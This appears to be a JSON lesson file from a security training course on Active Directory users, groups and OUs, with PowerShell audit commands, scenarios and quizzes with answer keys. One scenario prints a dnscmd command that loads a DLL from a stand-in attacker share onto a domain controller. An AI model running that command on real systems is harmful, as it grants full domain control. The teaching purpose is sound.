@@ -1,0 +1,193 @@
+{
+  "lesson_id": "44a2fac3-f287-46d9-82c1-4d04473e2e24",
+  "domain": "active_directory",
+  "title": "Active Directory Basics: Users, Groups, and OUs",
+  "difficulty": 1,
+  "order_index": 26,
+  "prerequisites": [
+    "active_directory_1",
+    "active_directory_2"
+  ],
+  "estimated_time": 40,
+  "concepts": [
+    "Active Directory",
+    "users",
+    "groups",
+    "Organizational Units",
+    "LDAP",
+    "domain controller",
+    "user accounts",
+    "security groups",
+    "distribution groups"
+  ],
+  "learning_objectives": [
+    "Understand the core building blocks of Active Directory: users, groups, and Organizational Units",
+    "Explain the difference between security groups and distribution groups",
+    "Describe how Organizational Units are used to organize and manage AD objects",
+    "Create and manage user accounts using both GUI and PowerShell",
+    "Identify how attackers target AD user and group structures"
+  ],
+  "jim_kwik_principles": [
+    "active_learning",
+    "minimum_effective_dose",
+    "teach_like_im_10",
+    "memory_hooks",
+    "meta_learning",
+    "connect_to_what_i_know",
+    "reframe_limiting_beliefs",
+    "gamify_it",
+    "learning_sprint",
+    "multiple_memory_pathways"
+  ],
+  "content_blocks": [
+    {
+      "block_id": "ec5da32b-7235-4f1c-a68d-0da84ef09c2f",
+      "type": "mindset_coach",
+      "content": {
+        "text": "Active Directory is everywhere. If you work in any organization with Windows computers, you're already living inside an Active Directory environment right now. Every login you do, every network drive you access, every printer you use — AD is managing it. Understanding AD isn't just an IT skill — it's THE skill for both defenders and attackers. Did you know that over 90% of Fortune 1000 companies use Active Directory? And did you know that in most ransomware attacks, the attackers spend days or weeks inside the AD environment BEFORE deploying ransomware? This lesson gives you the foundation to understand how AD works — which is the first step to both securing it and recognizing when it's being abused. You don't need to be a sysadmin to learn this. Think of it like learning the layout of a building before deciding where to put the security cameras."
+      }
+    },
+    {
+      "block_id": "ba8cb9bc-a0f3-4ddf-a789-308aae485064",
+      "type": "explanation",
+      "content": {
+        "text": "## What Is Active Directory?\n\nActive Directory (AD) is Microsoft's directory service — a centralized database that stores information about everything in your network: users, computers, printers, applications, and the rules governing who can access what.\n\nThink of Active Directory like a giant corporate phonebook combined with a security guard:\n- **Phonebook**: Stores details about everyone and everything (name, department, phone, permissions)\n- **Security guard**: Checks your ID (authentication) and decides what doors you can open (authorization)\n\n### The Core Components\n\n**Domain**: The fundamental unit of AD. A domain is a collection of objects (users, computers, groups) that share the same AD database. Example: `company.local` or `contoso.com`.\n\n**Domain Controller (DC)**: The server that runs Active Directory services. It's the heart of the domain — it handles all authentication requests and stores the AD database. Organizations typically have multiple DCs for redundancy.\n\n**Forest**: The highest level of AD organization. A forest is one or more domains that share a schema (the definition of what attributes objects can have) and a global catalog. Most smaller organizations have a single-domain forest.\n\n**Tree**: A collection of domains connected in a hierarchy, sharing a contiguous DNS namespace. Example: `contoso.com` → `sales.contoso.com` → `emea.sales.contoso.com`.\n\n### The LDAP Connection\n\nActive Directory communicates using **LDAP (Lightweight Directory Access Protocol)**. When your computer logs in, it's making LDAP queries to the domain controller. This is also how PowerShell cmdlets and admin tools read/write AD data.\n\nUnderstanding LDAP is important for security because:\n- Attackers use LDAP queries to enumerate (map out) all users, groups, and computers\n- Tools like BloodHound use LDAP to discover attack paths\n- Misconfigured LDAP permissions can leak sensitive information"
+      }
+    },
+    {
+      "block_id": "a5ad3d81-1d90-4d7a-b9f8-835341d44977",
+      "type": "explanation",
+      "content": {
+        "text": "## Active Directory Users\n\nUser accounts are the most fundamental objects in Active Directory. Each person who needs to access network resources gets a user account.\n\n### User Account Components\n\nEvery AD user account has:\n\n**Identity attributes:**\n- `sAMAccountName`: The login name (e.g., `jsmith`) — unique within a domain\n- `userPrincipalName` (UPN): Email-style login (e.g., `jsmith@company.com`)\n- `displayName`: Full name shown in the directory (e.g., `John Smith`)\n- `distinguishedName` (DN): Full LDAP path (e.g., `CN=John Smith,OU=IT,DC=company,DC=local`)\n\n**Account control attributes:**\n- `userAccountControl`: A bitmask controlling account behavior (enabled/disabled, password never expires, etc.)\n- `pwdLastSet`: When the password was last changed\n- `lastLogon`: When the account last logged in\n- `badPwdCount`: Failed login attempts\n- `lockoutTime`: When the account was locked out\n\n**Security attributes:**\n- `objectSid` (Security Identifier): Unique binary ID used by Windows security system — this never changes even if the username changes!\n- `memberOf`: Which groups this user belongs to\n- `adminCount`: Set to 1 if this account has been an admin — a key indicator for attackers\n\n### Security-Relevant User Properties\n\nFrom a security perspective, pay attention to:\n\n1. **Accounts with 'Password Never Expires'**: Often service accounts, but attackers love finding these with weak passwords\n2. **Accounts with 'Password Not Required'**: Should basically never exist\n3. **Accounts with `adminCount=1`**: These had (or still have) administrative privileges. Their ACLs are often misconfigured.\n4. **Stale accounts**: Users who left the company but accounts weren't disabled — common lateral movement vectors\n5. **Service accounts**: Accounts used by applications, often with elevated privileges and rarely monitored\n\n```powershell\n# Find accounts with password never expires\nGet-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires | Select Name, SamAccountName\n\n# Find accounts not logged in for 90+ days (potential stale accounts)\n$cutoff = (Get-Date).AddDays(-90)\nGet-ADUser -Filter {LastLogonDate -lt $cutoff -and Enabled -eq $true} -Properties LastLogonDate | Select Name, LastLogonDate\n\n# Find accounts with adminCount=1 (were admins at some point)\nGet-ADUser -Filter {adminCount -eq 1} -Properties adminCount | Select Name, SamAccountName\n```"
+      }
+    },
+    {
+      "block_id": "13e62feb-3c5b-44b5-809d-99f0ffe4206f",
+      "type": "explanation",
+      "content": {
+        "text": "## Active Directory Groups\n\nGroups collect users (and other objects) together so you can manage permissions in bulk instead of individually. Instead of granting 200 IT employees access to a file share one by one, you add them all to the 'IT Department' group and grant the group access.\n\n### Two Types of Groups\n\n**Security Groups** — Used to assign permissions and rights:\n- Control access to resources (files, folders, shares, applications)\n- Can be used as email distribution lists too\n- This is what you use for access control\n\n**Distribution Groups** — Email only:\n- Used solely for email distribution lists\n- Cannot be used to assign permissions\n- More common in Exchange/Office 365 environments\n\n### Three Group Scopes\n\n**Domain Local Group:**\n- Lives in one domain, controls resources in that domain only\n- Can contain users from any domain in the forest\n- Best for: Directly assigning permissions to resources\n- Example: `DL_FileShare_Read` (a group that grants read access to a specific file share)\n\n**Global Group:**\n- Lives in one domain, but can be used in any domain in the forest\n- Can only contain users from the SAME domain\n- Best for: Organizing users by role or department\n- Example: `G_IT_Administrators` (all IT admins in the company)\n\n**Universal Group:**\n- Lives in any domain, can be used in any domain\n- Can contain users from any domain in the forest\n- Best for: Multi-domain forests where you need global access\n- Example: `U_GlobalAdmins` (admins across all global offices)\n\n### The AGDLP Best Practice\n\nMicrosoft recommends this nesting strategy:\n**A**ccounts → **G**lobal groups → **D**omain **L**ocal groups → **P**ermissions\n\nIn practice:\n1. Users (Accounts) are added to Global groups based on role (e.g., `G_IT_Staff`)\n2. Global groups are nested into Domain Local groups (e.g., `DL_FileShare_ReadWrite`)\n3. Domain Local groups are assigned Permissions on resources\n\nThis makes auditing easier: to find who has access to a share, just look at the Domain Local group.\n\n### Critical Built-In Security Groups\n\nThese are the high-value targets in AD:\n\n| Group | What It Controls |\n|-------|------------------|\n| **Domain Admins** | Full control of the domain — the crown jewels |\n| **Enterprise Admins** | Full control of the entire forest |\n| **Schema Admins** | Can modify the AD schema — extremely powerful |\n| **Administrators** | Local admin on domain controllers |\n| **Account Operators** | Can create/modify user accounts |\n| **Backup Operators** | Can bypass NTFS permissions to backup files |\n| **Remote Desktop Users** | Can RDP into computers |\n| **DNSAdmins** | Can run code on DCs via DNS plugin — a known privilege escalation path! |\n\n```powershell\n# List members of Domain Admins\nGet-ADGroupMember -Identity \"Domain Admins\" -Recursive | Select Name, SamAccountName\n\n# Find all groups a user is member of (direct and nested)\nGet-ADPrincipalGroupMembership -Identity jsmith | Select Name\n\n# Find groups with no members (cleanup candidates)\nGet-ADGroup -Filter * -Properties Members | Where {$_.Members.Count -eq 0} | Select Name\n```"
+      }
+    },
+    {
+      "block_id": "3d391056-0ec2-4bc7-a1ae-03e3d790180c",
+      "type": "explanation",
+      "content": {
+        "text": "## Organizational Units (OUs)\n\nOrganizational Units are containers within Active Directory that help organize objects (users, computers, groups, printers) into logical structures. They're like folders in a file system for your AD objects.\n\n### Why OUs Matter\n\n**1. Organization**: Group related objects logically (by department, location, function)\n**2. Administration**: Delegate control — give the Help Desk team permission to reset passwords in the IT OU without making them Domain Admins\n**3. Group Policy**: Apply different settings to different OUs (e.g., stricter password policy for Finance OU, different desktop settings for IT OU)\n\n### OU vs. Group: The Key Difference\n\nThis confuses beginners:\n- **OUs**: Organizational containers. Used for management (delegation, GPO application). You put objects IN an OU.\n- **Groups**: Security containers. Used for permissions. Users are MEMBERS OF a group.\n\nA user lives in ONE OU (their primary location in the directory). A user can be in MANY groups (each granting different permissions).\n\n### Common OU Structures\n\n**Geographic structure:**\n```\ndomain.local\n├── US\n│   ├── New York\n│   │   ├── Users\n│   │   ├── Computers\n│   │   └── Servers\n│   └── Los Angeles\n│       ├── Users\n│       └── Computers\n└── UK\n    └── London\n        ├── Users\n        └── Computers\n```\n\n**Departmental structure:**\n```\ndomain.local\n├── IT Department\n│   ├── Admins\n│   ├── Help Desk\n│   └── Developers\n├── Finance\n│   ├── Accounting\n│   └── Payroll\n├── HR\n└── Executives\n```\n\n**Hybrid (most common in real organizations):**\n```\ndomain.local\n├── Tier0 (Domain Controllers, PKI)\n├── Tier1 (Servers)\n├── Tier2 (Workstations)\n├── Users\n│   ├── IT\n│   ├── Finance\n│   └── Operations\n└── Service Accounts\n```\n\n### Delegation of Control\n\nDelegation lets you grant specific permissions to non-admins for specific OUs — without making them Domain Admins:\n\n```powershell\n# Delegate 'Reset Password' permission to HelpDesk group on Users OU\n# (Usually done via GUI: right-click OU → Delegate Control)\n\n# View delegated permissions on an OU\n(Get-Acl \"AD:OU=Users,DC=company,DC=local\").Access | Where {$_.IdentityReference -like \"*HelpDesk*\"}\n```\n\nFrom a security perspective, OU delegation is a common path for privilege escalation. If an attacker compromises an account with 'Reset Password' delegation on a high-value OU, they can reset Domain Admin passwords!"
+      }
+    },
+    {
+      "block_id": "40a02f57-9f1c-4d29-a125-b614eef1e1c4",
+      "type": "diagram",
+      "content": {
+        "text": "## Active Directory Structure — Visual Overview\n\n```\n                        [FOREST: company.com]\n                               |\n                    [DOMAIN: company.com]\n                    (Domain Controller)\n                          |\n         +----------------+------------------+\n         |                |                  |\n    [OU: IT]         [OU: Finance]      [OU: HR]\n         |                |                  |\n    +----+----+      +----+----+         [Users]\n    |         |      |         |              |\n[Users] [Computers] [Users] [Servers]      [Jane]\n    |                                      member of:\n  [John]                              [G_HR_Staff]\n  member of:\n  [G_IT_Admins]\n  [G_IT_Staff]\n       |\n       v\n  Nested into:\n  [DL_Servers_Admin]  ← assigned permission on server OU\n  [DL_DC_RDP]         ← assigned RDP rights on DCs\n\n```\n\n## Group Scope Cheat Sheet\n\n```\n+------------------+-------------------+----------------------+--------------------+\n| Scope            | Members from      | Can control in       | Best used for      |\n+------------------+-------------------+----------------------+--------------------+\n| Domain Local     | Any domain        | Local domain only    | Resource access    |\n| Global           | Same domain only  | Any domain           | Role-based groups  |\n| Universal        | Any domain        | Any domain           | Multi-domain       |\n+------------------+-------------------+----------------------+--------------------+\n```\n\n## User Account Security Attributes\n\n```\n[User Object: John Smith]\n├── sAMAccountName: jsmith\n├── userPrincipalName: jsmith@company.com\n├── objectSid: S-1-5-21-...-1234 (permanent unique ID)\n├── userAccountControl: 0x10200 (normal account, pwd not required?)\n├── pwdLastSet: 2024-01-15\n├── lastLogon: 2024-01-20\n├── adminCount: 0 (not a privileged account)\n└── memberOf:\n    ├── CN=G_IT_Staff,OU=Groups,DC=company,DC=local\n    └── CN=G_VPN_Users,OU=Groups,DC=company,DC=local\n```"
+      }
+    },
+    {
+      "block_id": "df27a447-39eb-40e9-9ebe-e3a6e823453b",
+      "type": "real_world",
+      "content": {
+        "text": "## Real-World Scenario: The Stale Account Attack\n\n**The Setup:** A manufacturing company had 2,400 employees in their Active Directory. IT policy was to disable accounts when employees left, but the process relied on HR manually notifying IT — and this process broke down.\n\n**What Happened:** A threat actor conducting a phishing campaign sent emails to former employees whose addresses were still active in the email system. One former employee — who had left 8 months ago but whose account was never disabled — clicked a phishing link and entered their AD credentials.\n\nThe attacker logged in with these credentials. The account was still in the `G_Servers_Access` group (the employee had been a sysadmin). The attacker spent two weeks mapping the network using standard LDAP queries, identifying all servers, admin accounts, and backup systems. They then deployed ransomware, demanding $2.5 million.\n\n**The Root Cause:** Stale user account + inherited group memberships + no monitoring for unusual LDAP queries.\n\n**What Should Have Been Done:**\n1. **Automated offboarding**: Scripted process to disable AD accounts the same day HR processes a termination\n2. **Regular access reviews**: Quarterly review of group memberships, especially privileged groups\n3. **Alert on unused accounts**: SIEM alert when an account that hasn't logged in for 90+ days suddenly authenticates\n4. **Principle of least privilege**: The account didn't need server access 8 months after the employee had moved to a non-technical role\n\n---\n\n## Real-World Scenario: DNSAdmins Privilege Escalation\n\n**The Attack:** A penetration tester discovered that a junior IT staff member had been added to the `DNSAdmins` group to help manage DNS records. Unknown to the IT team, the `DNSAdmins` group has a feature that allows it to load a custom DLL as a DNS server plugin.\n\n**The Exploit:** The tester created a malicious DLL that added a new Domain Admin account when loaded. Using the junior IT staff's credentials, they configured the DNS server to load their DLL:\n\n```cmd\ndnscmd.exe <DC_hostname> /config /serverlevelplugindll \\\\attacker_share\\evil.dll\n```\n\nWhen the DNS service restarted (or was forced to restart), the malicious DLL executed as SYSTEM on the Domain Controller — instantly giving full domain compromise.\n\n**The Lesson:** `DNSAdmins` seems like a low-risk group. It's not. Many 'non-privileged' groups in AD have paths to Domain Admin. This is exactly what tools like BloodHound were designed to reveal."
+      }
+    },
+    {
+      "block_id": "b13992fa-f015-41fc-9535-0dd0dda759ca",
+      "type": "code_exercise",
+      "content": {
+        "text": "## Hands-On: PowerShell Active Directory Commands\n\nThese are the essential PowerShell commands for working with AD users, groups, and OUs. Practice these in a lab environment (or a Windows Server with RSAT installed).\n\n### User Management\n\n```powershell\n# ===== READING USER INFO =====\n\n# Get basic info about a user\nGet-ADUser -Identity jsmith\n\n# Get ALL properties (useful for security review)\nGet-ADUser -Identity jsmith -Properties *\n\n# Search for users by filter\nGet-ADUser -Filter {Department -eq \"IT\"} -Properties Department, Title | Select Name, Title, Department\n\n# Find all enabled users\nGet-ADUser -Filter {Enabled -eq $true} | Measure-Object  # Count\n\n# Find users with weak security settings\nGet-ADUser -Filter {PasswordNeverExpires -eq $true -and Enabled -eq $true} `\n    -Properties PasswordNeverExpires, LastLogonDate | `\n    Select Name, SamAccountName, LastLogonDate\n\n\n# ===== CREATING USERS =====\n\n# Create a new user\nNew-ADUser `\n    -Name \"Jane Doe\" `\n    -GivenName \"Jane\" `\n    -Surname \"Doe\" `\n    -SamAccountName \"jdoe\" `\n    -UserPrincipalName \"jdoe@company.com\" `\n    -Path \"OU=Users,OU=IT,DC=company,DC=local\" `\n    -AccountPassword (ConvertTo-SecureString \"P@ssw0rd123!\" -AsPlainText -Force) `\n    -Enabled $true `\n    -PasswordNeverExpires $false `\n    -ChangePasswordAtLogon $true\n\n\n# ===== MODIFYING USERS =====\n\n# Disable a user account (offboarding step 1)\nDisable-ADAccount -Identity jsmith\n\n# Reset password\nSet-ADAccountPassword -Identity jsmith -NewPassword (ConvertTo-SecureString \"NewP@ss123!\" -AsPlainText -Force) -Reset\n\n# Force password change at next login\nSet-ADUser -Identity jsmith -ChangePasswordAtLogon $true\n\n# Move user to a different OU\nMove-ADObject -Identity \"CN=John Smith,OU=IT,DC=company,DC=local\" `\n    -TargetPath \"OU=Disabled,DC=company,DC=local\"\n```\n\n### Group Management\n\n```powershell\n# ===== READING GROUP INFO =====\n\n# Get group details\nGet-ADGroup -Identity \"Domain Admins\" -Properties *\n\n# List all members of a group (including nested)\nGet-ADGroupMember -Identity \"IT Administrators\" -Recursive | Select Name, SamAccountName, objectClass\n\n# Find all groups a user belongs to\n(Get-ADUser -Identity jsmith -Properties MemberOf).MemberOf\n\n# Find groups with more than 10 members (large groups warrant audit)\nGet-ADGroup -Filter * -Properties Members | Where {$_.Members.Count -gt 10} | Select Name, @{N='MemberCount';E={$_.Members.Count}} | Sort MemberCount -Descending\n\n\n# ===== MODIFYING GROUPS =====\n\n# Add user to group\nAdd-ADGroupMember -Identity \"G_VPN_Users\" -Members jsmith\n\n# Remove user from group\nRemove-ADGroupMember -Identity \"G_VPN_Users\" -Members jsmith -Confirm:$false\n\n# Add group to group (nesting)\nAdd-ADGroupMember -Identity \"DL_Servers_Access\" -Members \"G_IT_Admins\"\n```\n\n### OU Management\n\n```powershell\n# ===== VIEWING OUs =====\n\n# List all OUs\nGet-ADOrganizationalUnit -Filter * | Select Name, DistinguishedName\n\n# Get objects in a specific OU\nGet-ADObject -Filter * -SearchBase \"OU=IT,DC=company,DC=local\" -Properties objectClass | Select Name, objectClass\n\n\n# ===== CREATING OUs =====\n\n# Create a new OU\nNew-ADOrganizationalUnit -Name \"Contractors\" -Path \"OU=Users,DC=company,DC=local\" -ProtectedFromAccidentalDeletion $true\n\n\n# ===== SECURITY REVIEW QUERIES =====\n\n# Full privileged account audit\n@(\"Domain Admins\", \"Enterprise Admins\", \"Schema Admins\", \"Administrators\") | ForEach-Object {\n    $group = $_\n    Get-ADGroupMember -Identity $group -Recursive | ForEach-Object {\n        [PSCustomObject]@{\n            Group = $group\n            Name = $_.Name\n            SamAccountName = $_.SamAccountName\n        }\n    }\n} | Export-Csv -Path C:\\privileged_accounts_audit.csv -NoTypeInformation\n```\n\n**Exercise:** Run these commands in a test environment and answer:\n1. How many users in your domain have 'PasswordNeverExpires'?\n2. How many groups does the average user belong to?\n3. Which OUs have the most users in them?"
+      }
+    },
+    {
+      "block_id": "4f265214-01d8-45b6-a641-debb1e7d78af",
+      "type": "memory_aid",
+      "content": {
+        "text": "## Memory Hook: The Company Building Analogy\n\nActive Directory is like a company building:\n\n**The BUILDING = Domain**\n- Everything inside belongs to this domain\n- The building address = domain name (company.local)\n\n**The SECURITY DESK = Domain Controller**\n- Checks everyone's ID (authentication)\n- Has the master list of who's allowed where\n- If this is compromised, the whole building is compromised\n\n**FLOORS = Organizational Units (OUs)**\n- 1st floor = IT department\n- 2nd floor = Finance\n- Each floor can have different security rules (Group Policies)\n- You can give a floor manager (delegation) keys to THEIR floor only\n\n**EMPLOYEES = Users**\n- Each employee has a badge (user account)\n- Badge has a unique ID that never changes (ObjectSID) even if they change their name\n- Badge lists what they're allowed to access (permissions via group membership)\n\n**ACCESS CARDS = Groups**\n- 'IT Staff' access card opens server room, gives VPN access\n- 'All Employees' card opens cafeteria and parking\n- One employee can have MANY access cards\n- Cards are managed separately from which floor you sit on!\n\n**Remember the key difference:**\n- Which FLOOR you sit on = OU (one per person)\n- Which ACCESS CARDS you have = Groups (many per person)\n\n**AGDLP reminder:**\n'**A** **G**reat **D**omain **L**eads to better **P**ermissions'\nAccounts → Global groups → Domain Local groups → Permissions"
+      }
+    },
+    {
+      "block_id": "7a48befb-218f-4d82-b360-b05382d013f6",
+      "type": "quiz",
+      "content": {
+        "text": "## Knowledge Check\n\n**Q1:** A user needs access to a file share. You create a group called `DL_FileShare_Read` and grant it read permission. Where do you put the user?\nA) Directly in the `DL_FileShare_Read` group\nB) In a Global group like `G_Finance_Staff`, then nest that group into `DL_FileShare_Read`\nC) In the OU that contains the file server\nD) In the Domain Admins group\n\n**Answer: B** — This follows the AGDLP best practice. Users go into Global groups by role, Global groups are nested into Domain Local groups, and permissions are assigned to Domain Local groups. This makes auditing much cleaner.\n\n---\n\n**Q2:** What is the key difference between an OU and a Group in Active Directory?\nA) OUs store users, Groups store computers\nB) OUs are used for permissions, Groups are used for organization\nC) OUs organize objects for management/GPO, Groups assign permissions to resources\nD) There is no meaningful difference\n\n**Answer: C** — OUs are containers for organizing AD objects, applying Group Policy, and delegating admin control. Groups are security or distribution containers used to assign permissions. A user lives in ONE OU but can be in MANY groups.\n\n---\n\n**Q3:** An attacker compromises an account that's a member of the `DNSAdmins` group. Why is this dangerous?\nA) They can read all DNS queries\nB) They can load a custom DLL as a DNS plugin, which runs as SYSTEM on the Domain Controller\nC) They can redirect all network traffic through their own DNS server\nD) DNS admins have read access to all user passwords\n\n**Answer: B** — The DNSAdmins group has the ability to configure the DNS server to load a custom plugin DLL. Since DNS runs as SYSTEM on domain controllers, this allows privilege escalation to full domain compromise. This is a well-known attack path."
+      }
+    },
+    {
+      "block_id": "76dddfca-8e83-48e5-bc96-0c457e2f2d9e",
+      "type": "reflection",
+      "content": {
+        "text": "## Reflection: Map Your Own AD Environment\n\nThink about the organization you work in (or a previous employer, or a hypothetical company with 500 employees).\n\n**Questions to reflect on:**\n\n1. **What OU structure would make sense?** Would you organize by department, by location, or by tier (user/computer/server)? What are the trade-offs of each approach?\n\n2. **Who REALLY needs to be in Domain Admins?** In most organizations, Domain Admins has too many members. What would a lean, secure group look like? (Hint: usually just 2-3 break-glass emergency accounts, not everyone who ever needed to install software.)\n\n3. **Think about the last company you worked at.** Were there stale user accounts? What was the process for disabling accounts when someone left? How confident are you that it was followed consistently?\n\n4. **The DNSAdmins attack path exists in EVERY Active Directory environment.** If you were a security engineer at a company, what would you do about it? (Consider: Can you remove everyone from DNSAdmins? What would break? How would you monitor it?)\n\n5. **If an attacker got a standard user account in your organization**, what's the first thing they'd do with it? (Enumerate groups, find Domain Admins members, look for service accounts, check for delegation...)\n\n**Key Takeaway:** AD security isn't about perfect setup from day one — it's about continuous hygiene. Regular reviews of group memberships, prompt account disabling, and monitoring for unusual authentication patterns are what keep AD environments secure."
+      }
+    }
+  ],
+  "post_assessment": [
+    {
+      "question_id": "ef4fee6f-fb20-43b5-91ef-ab13958d352c",
+      "type": "multiple_choice",
+      "question": "What attribute uniquely identifies an Active Directory user even if their username or name changes?",
+      "options": [
+        "A) sAMAccountName",
+        "B) userPrincipalName",
+        "C) objectSid (Security Identifier)",
+        "D) distinguishedName"
+      ],
+      "correct_answer": "C",
+      "explanation": "The objectSid (Security Identifier) is a binary value that uniquely identifies a user object and never changes, even if the user's name or account name is modified. Windows uses SIDs internally for all permission checks. The other identifiers (sAMAccountName, UPN, DN) can be changed by administrators.",
+      "difficulty": 1
+    },
+    {
+      "question_id": "f40e1b46-659c-4e8c-85df-ea739e75d59c",
+      "type": "multiple_choice",
+      "question": "Which type of Active Directory group should be used to directly assign permissions to a file share?",
+      "options": [
+        "A) Global Group",
+        "B) Universal Group",
+        "C) Distribution Group",
+        "D) Domain Local Group"
+      ],
+      "correct_answer": "D",
+      "explanation": "Domain Local groups are designed to control access to resources within their domain. The AGDLP best practice has users in Global groups (by role), Global groups nested into Domain Local groups, and Domain Local groups assigned permissions on resources. Universal groups are for multi-domain forests, and Distribution groups cannot be used for permissions.",
+      "difficulty": 1
+    },
+    {
+      "question_id": "82daba9b-ddd6-4750-9c31-714b55c85d4b",
+      "type": "multiple_choice",
+      "question": "What is the PRIMARY purpose of Organizational Units (OUs) in Active Directory?",
+      "options": [
+        "A) To group users for email distribution",
+        "B) To assign permissions to resources",
+        "C) To organize objects for administrative delegation and Group Policy application",
+        "D) To authenticate users against the domain"
+      ],
+      "correct_answer": "C",
+      "explanation": "OUs serve two main purposes: (1) organizing AD objects logically, and (2) serving as the target for Group Policy Objects (GPOs) and administrative delegation. OUs do NOT assign permissions (that's what Groups do) and are not involved in authentication (that's the Domain Controller). A user lives in one OU but can be in many groups.",
+      "difficulty": 1
+    },
+    {
+      "question_id": "6d38c328-0d38-4350-9471-ebe7f016f501",
+      "type": "multiple_choice",
+      "question": "An attacker compromises a user account and queries Active Directory. What is the MOST likely first thing they look for?",
+      "options": [
+        "A) The company's organizational chart stored in HR systems",
+        "B) Members of privileged groups like Domain Admins and their attributes",
+        "C) The list of all domain controllers by operating system version",
+        "D) Files stored on individual user workstations"
+      ],
+      "correct_answer": "B",
+      "explanation": "After getting initial access, attackers immediately enumerate privileged groups (Domain Admins, Enterprise Admins, etc.) to identify targets for privilege escalation. They also look for service accounts, accounts with adminCount=1, Kerberoastable accounts, and potential delegation misconfigurations. This enumeration can be done with any domain user account using LDAP queries.",
+      "difficulty": 1
+    },
+    {
+      "question_id": "ec5f7196-d49d-4fb5-a7a0-214cb8c883a3",
+      "type": "multiple_choice",
+      "question": "A user in the 'Help Desk' team has been delegated 'Reset Password' permission on the 'Executive' OU. Why is this a security risk?",
+      "options": [
+        "A) It is not a risk — delegation is designed for exactly this purpose",
+        "B) Help Desk staff will have too much work resetting executive passwords",
+        "C) The Help Desk user could reset an executive's password, potentially gaining access to privileged accounts or using it as a privilege escalation path",
+        "D) Delegation doesn't work on OUs containing executive accounts"
+      ],
+      "correct_answer": "C",
+      "explanation": "Delegating 'Reset Password' permission on an OU gives the delegated account the ability to reset ANY account's password in that OU, including Tier 0 accounts (Domain Admins, executives) if they're in that OU. An attacker who compromises the Help Desk account could reset an executive's password, take over their account, and if they're a Domain Admin, achieve full domain compromise. This is a well-known privilege escalation path documented in tools like BloodHound.",
+      "difficulty": 1
+    }
+  ]
+}
